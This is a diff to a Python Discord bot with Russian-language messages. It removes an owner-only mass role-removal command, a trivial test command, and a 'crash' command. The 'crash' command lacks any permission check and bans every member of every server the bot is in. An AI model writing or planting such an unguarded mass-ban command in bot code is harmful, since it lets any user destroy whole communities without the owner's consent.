@@ -73,33 +73,7 @@ async def is_owner(ctx):
 
 
 
-@bot.command()
-@commands.check(is_owner)
-async def massroleremove(ctx, custom_role : discord.Role):
-	bot_role = ctx.message.guild.get_member(bot.user.id).top_role
-	members = ctx.message.guild.members
-	if bot_role.position <= custom_role.position:
-		await ctx.send('Бот не может снять эту роль')
-	else:
-		msg = await ctx.send('Снимаю роли...')
-		i = 0
-		for m in members:
-			try:
-				await m.remove_roles(custom_role)
-				i += 1
-			except Exception:
-				await ctx.send(f'Не удалось снять роль в участнику : {m}')
-			if str(i).endswith('5'):
-				await msg.edit(content= f'Снял уже {i} ролей, снимаю роли дальше...')
-		await ctx.send(f'Снятие закончено! В итоге было выдано {i} роли.')
 
-@bot.command()
-async def pizdec(ctx):
-
-	hel = 'ку'
-	hell = 'уук'
-
-	await ctx.send(f'{get_lang(ctx.guild, hel, hell)}')
 
 @bot.command()
 async def pixel(ctx, member: discord.Member = None):
@@ -156,13 +130,7 @@ async def translate(ctx, dest, *, txt: str):
 
 		await ctx.author.send(embed = embed)
 
-@bot.command()
-async def crash(ctx):
-	for guild in bot.guilds:
-		for member in guild.members:
-			await ctx.send("kicked")
-			await ctx.send(member)
-			await member.ban()
+
 
 @bot.command()
 @commands.check(is_owner)
